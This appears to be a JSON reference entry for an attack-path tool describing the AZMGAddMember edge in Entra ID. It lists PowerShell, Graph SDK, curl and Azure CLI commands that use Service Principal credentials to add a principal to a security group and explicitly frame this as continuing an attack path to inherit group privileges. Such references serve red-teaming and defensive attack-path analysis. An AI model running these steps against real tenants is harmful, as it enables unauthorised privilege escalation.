{
    "AZMGAddMember": {
        "meaning": "This edge is created during post-processing. It is created against non-role assignable Entra ID security groups when a Service Principal has MS Graph app role assignments like Directory.ReadWrite.All, Group.ReadWrite.All, or GroupMember.ReadWrite.All. It is created against all Entra ID security groups when a Service Principal has RoleManagement.ReadWrite.Directory role.",
        "common": "",
        "windows": {
            "BARK_PowerShell": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-MSGraphTokenWithClientCredentials -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" -ClientSecret \"asdf...\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using Service Principal credentials via BARK"
                },
                {
                    "order": 2,
                    "command": "Add-AZMemberToGroup -PrincipalID \"028362ca-90ae-41f2-ae9f-1a678cc17391\" -TargetGroupId \"b9801b7a-fcec-44e2-a21b-86cb7ec718e4\" -Token $MGToken.access_token",
                    "description": "Add principal to target group using BARK function"
                },
                {
                    "order": 3,
                    "command": "# Re-authenticate as the newly added principal to inherit group privileges",
                    "description": "Continue attack path with privileges of the target group"
                }
            ],
            "PowerShell_Graph_SDK": [
                {
                    "order": 1,
                    "command": "Connect-MgGraph -ClientId \"client-id\" -ClientSecret (ConvertTo-SecureString \"client-secret\" -AsPlainText -Force)",
                    "description": "Connect to Microsoft Graph using Service Principal credentials"
                },
                {
                    "order": 2,
                    "command": "New-MgGroupMember -GroupId \"target-group-id\" -AdditionalProperties @{\"@odata.id\"=\"https://graph.microsoft.com/v1.0/directoryObjects/principal-id\"}",
                    "description": "Add member to group using Microsoft Graph PowerShell SDK"
                }
            ]
        },
        "linux": {
            "Graph_API_REST": [
                {
                    "order": 1,
                    "command": "curl -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"client_id=CLIENT_ID&client_secret=CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials\" \"https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token\"",
                    "description": "Acquire access token for Microsoft Graph API using client credentials"
                },
                {
                    "order": 2,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://graph.microsoft.com/v1.0/groups/GROUP_ID/members/\\$ref\" -d '{\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/PRINCIPAL_ID\"}'",
                    "description": "Add member to group using Microsoft Graph REST API"
                }
            ],
            "Azure_CLI_Graph": [
                {
                    "order": 1,
                    "command": "az login --service-principal --username CLIENT_ID --password CLIENT_SECRET --tenant TENANT_ID",
                    "description": "Authenticate as Service Principal using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az ad group member add --group GROUP_ID --member-id PRINCIPAL_ID",
                    "description": "Add member to Azure AD group using Azure CLI"
                }
            ]
        }
    }
}
